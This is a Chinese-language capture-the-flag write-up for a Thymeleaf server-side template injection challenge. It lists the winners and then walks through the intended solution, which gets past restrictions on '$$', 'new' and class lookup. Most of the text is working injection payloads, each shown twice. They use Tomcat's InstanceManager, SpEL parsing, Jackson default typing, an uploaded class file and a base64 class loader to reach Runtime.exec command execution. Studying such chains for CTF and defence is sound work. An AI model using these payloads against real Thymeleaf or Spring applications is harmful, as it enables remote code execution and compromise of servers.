# ssti挑战——wp

> 原文: https://www.ctfiot.com/301690.html
> ID: 301690

前文

ssti挑战——有奖金

奖金获取情况，因为自己的失误改动过题目，因此改动前后的挑战者独立计算奖金。

改动前，JZX第一名，Miku0x39第二名。其中JZX在改动后也做出了非常优秀的解。

改动后，无敌暴龙战士第一名，JZX第二名，貔貅第三名，77/glzjin/北辰/chao也都做了出来。

无敌暴龙战士/貔貅/glzjin和预期解几乎一样，那就先说预期解，也就是thymeleaf模板注入。可以先阅读

Thymeleaf SSTI bypass历史

这题本质上有三层防护。

第一层防护，不让用$$。

__|$*{#ctx.getExchange().getNativeResponseObject().addHeader("cmd","test")}|__::.

第二层防护，不让用new。

而最新版thymeleaf将T和Class.forName()都封堵了，看起来几乎无法实例化类了。

我们可以从S2-061上取经，S2-061是从ognl的内置对象application上取到了org.apache.catalina.core.DefaultInstanceManager。

有两种方法都取得到

@servletContext.getAttribute('org.apache.tomcat.InstanceManager')#ctx.getExchange().getApplication().getAttributeValue("org.apache.tomcat.InstanceManager")

__|$*{#ctx.getExchange().getNativeResponseObject().addHeader("cmd",@servletContext.getAttribute('org.apache.tomcat.InstanceManager').newInstance('org.springframework.expression.spel.standard.SpelExpressionParser').toString())}|__::.

这个就有多种小技巧。

1，利用一个不存在的函数单个请求执行多行代码

2，对反复使用的对象注册临时变量

__|$*{qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),#w.flush(),#w.write("qqq"))}|__::.

@servletContext.setAttribute("key","value")#ctx.getExchange().getApplication().getNativeServletContextObject().setAttribute("key","value")

__|$*{@servletContext.setAttribute("p",@servletContext.getAttribute("org.apache.tomcat.InstanceManager").newInstance("org.springframework.expression.spel.standard.SpelExpressionParser"))}|__::.__|$*{@servletContext.setAttribute("spel","n"%2B"ew java.util.Scanner(T"%2B"(java.lang.Runtime).getRuntime().exec('ping 127.0.0.1').getInputStream()).useDelimiter('\a').next()")}|__::.__|$*{@servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()}|__::.__|$*{qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),#w.flush(),#w.write(@servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()))}|__::.

__|$*{@servletContext.setAttribute("spel",@servletContext.getAttribute("spel")%2B"QQQQQQQQQQQQQQ")}|__::.

new.com.fasterxml.jackson.databind.ObjectMapper()

__|**{#ctx.x(#r=#ctx.getExchange().getNativeRequestObject(),#f=#r.getServletContext().getRealPath("WEB-INF/classes/BS.class"),new.ch.qos.logback.core.FileAppender().openFile(#f),#r.getParts().get(0).write(#f),new.BS())}|__::.

//@jacksonObjectMapper ObjectMappermapper=newObjectMapper(); mapper.enableDefaultTyping(); JavaTypejavaType=mapper.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser"); SpelExpressionParserparser= mapper.readValue("{}", javaType); parser.parseExpression("T (java.lang.Runtime).getRuntime().exec("calc")").getValue();

__|$*{@jacksonObjectMapper.enableDefaultTyping()}|__::.__|$*{@servletContext.setAttribute("javatype",@jacksonObjectMapper.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser"))}|__::.__|$*{@servletContext.setAttribute("parser",@jacksonObjectMapper.readValue("{}",@servletContext.getAttribute("javatype")))}|__::.__|$*{@servletContext.getAttribute("parser").parseExpression("T"%2B" (java.lang.Runtime).getRuntime().exec('calc')").getValue()}|__::.

//@jacksonObjectMapper ObjectMappermapper=newObjectMapper(); mapper.enableDefaultTyping(); Stringjson1="{rn" +" "a": [rn" +" "org.springframework.beans.factory.config.MethodInvokingFactoryBean",rn" +" {"staticMethod":"java.lang.Runtime.getRuntime"}rn" +" ],rn" +" "b": [rn" +" "org.springframework.beans.factory.config.MethodInvokingFactoryBean",rn" +" {rn" +" "targetMethod":"exec",rn" +" "arguments": ["calc"]rn" +" }rn" +" ]" +"}"; System.out.println(json1.replaceAll("\s+","")); LinkedHashMapmap=mapper.readValue(json1,LinkedHashMap.class); MethodInvokingFactoryBeanbeanA= (MethodInvokingFactoryBean) map.get("a"); beanA.afterPropertiesSet(); Runtimeruntime= (Runtime)beanA.getObject(); MethodInvokingFactoryBeanbeanB= (MethodInvokingFactoryBean) map.get("b"); beanB.setTargetObject(runtime); beanB.afterPropertiesSet(); beanB.getObject();

@resourceHandlerMapping.urlMap.getClass()

username=__|$*{@jacksonObjectMapper.readValue("{}",@jacksonObjectMapper.getTypeFactory().findClass("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression(#ctx.getExchange().getNativeRequestObject().getParameter('a')).getValue()}|__::.&a=T(org.springframework.cglib.core.ReflectUtils).defineClass('payload.SpringEcho',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgQQQQ'),newjavax.management.loading.MLet(newjava.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()


```
__|$*{#ctx.getExchange().getNativeResponseObject().addHeader("cmd","test")}|__::.
```



```
@servletContext.getAttribute('org.apache.tomcat.InstanceManager')#ctx.getExchange().getApplication().getAttributeValue("org.apache.tomcat.InstanceManager")
```



```
__|$*{#ctx.getExchange().getNativeResponseObject().addHeader("cmd",@servletContext.getAttribute('org.apache.tomcat.InstanceManager').newInstance('org.springframework.expression.spel.standard.SpelExpressionParser').toString())}|__::.
```



```
__|$*{qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),#w.flush(),#w.write("qqq"))}|__::.
```



```
@servletContext.setAttribute("key","value")#ctx.getExchange().getApplication().getNativeServletContextObject().setAttribute("key","value")
```



```
__|$*{@servletContext.setAttribute("p",@servletContext.getAttribute("org.apache.tomcat.InstanceManager").newInstance("org.springframework.expression.spel.standard.SpelExpressionParser"))}|__::.__|$*{@servletContext.setAttribute("spel","n"%2B"ew java.util.Scanner(T"%2B"(java.lang.Runtime).getRuntime().exec('ping 127.0.0.1').getInputStream()).useDelimiter('\a').next()")}|__::.__|$*{@servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()}|__::.__|$*{qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),#w.flush(),#w.write(@servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()))}|__::.
```



```
__|$*{@servletContext.setAttribute("spel",@servletContext.getAttribute("spel")%2B"QQQQQQQQQQQQQQ")}|__::.
```



```
new.com.fasterxml.jackson.databind.ObjectMapper()
```



```
__|**{#ctx.x(#r=#ctx.getExchange().getNativeRequestObject(),#f=#r.getServletContext().getRealPath("WEB-INF/classes/BS.class"),new.ch.qos.logback.core.FileAppender().openFile(#f),#r.getParts().get(0).write(#f),new.BS())}|__::.
```



```
//@jacksonObjectMapper ObjectMappermapper=newObjectMapper(); mapper.enableDefaultTyping(); JavaTypejavaType=mapper.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser"); SpelExpressionParserparser= mapper.readValue("{}", javaType); parser.parseExpression("T (java.lang.Runtime).getRuntime().exec("calc")").getValue();
```



```
__|$*{@jacksonObjectMapper.enableDefaultTyping()}|__::.__|$*{@servletContext.setAttribute("javatype",@jacksonObjectMapper.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser"))}|__::.__|$*{@servletContext.setAttribute("parser",@jacksonObjectMapper.readValue("{}",@servletContext.getAttribute("javatype")))}|__::.__|$*{@servletContext.getAttribute("parser").parseExpression("T"%2B" (java.lang.Runtime).getRuntime().exec('calc')").getValue()}|__::.
```



```
//@jacksonObjectMapper ObjectMappermapper=newObjectMapper(); mapper.enableDefaultTyping(); Stringjson1="{rn" +" "a": [rn" +" "org.springframework.beans.factory.config.MethodInvokingFactoryBean",rn" +" {"staticMethod":"java.lang.Runtime.getRuntime"}rn" +" ],rn" +" "b": [rn" +" "org.springframework.beans.factory.config.MethodInvokingFactoryBean",rn" +" {rn" +" "targetMethod":"exec",rn" +" "arguments": ["calc"]rn" +" }rn" +" ]" +"}"; System.out.println(json1.replaceAll("\s+","")); LinkedHashMapmap=mapper.readValue(json1,LinkedHashMap.class); MethodInvokingFactoryBeanbeanA= (MethodInvokingFactoryBean) map.get("a"); beanA.afterPropertiesSet(); Runtimeruntime= (Runtime)beanA.getObject(); MethodInvokingFactoryBeanbeanB= (MethodInvokingFactoryBean) map.get("b"); beanB.setTargetObject(runtime); beanB.afterPropertiesSet(); beanB.getObject();
```



```
@resourceHandlerMapping.urlMap.getClass()
```



```
username=__|$*{@jacksonObjectMapper.readValue("{}",@jacksonObjectMapper.getTypeFactory().findClass("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression(#ctx.getExchange().getNativeRequestObject().getParameter('a')).getValue()}|__::.&a=T(org.springframework.cglib.core.ReflectUtils).defineClass('payload.SpringEcho',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgQQQQ'),newjavax.management.loading.MLet(newjava.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315422-wxsync-2026-03-5a847e8163a6b46fdbf81c7b85d73c3c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315423-wxsync-2026-03-8632fbb4bb106e0315a1ec4b9207fdca.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315425-wxsync-2026-03-4e73b100ef6706ef6d017b702f3ae18c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315426-wxsync-2026-03-47f4b047a9bc2267995dbf585180e4a4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315428-wxsync-2026-03-720d9293487e147afa9abf27078d404b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315429-wxsync-2026-03-d6b75707395029dfcd90a999add5bfd4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315431-wxsync-2026-03-bc69fd7e055ca24af72adc0d685253ec.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315433-wxsync-2026-03-489897a27d05497e5305e3a72585423e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315434-wxsync-2026-03-b9406339e31db80434c396687dce767d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773315436-wxsync-2026-03-8010d8a9369d6a887dd7a1e512e15f8e.png)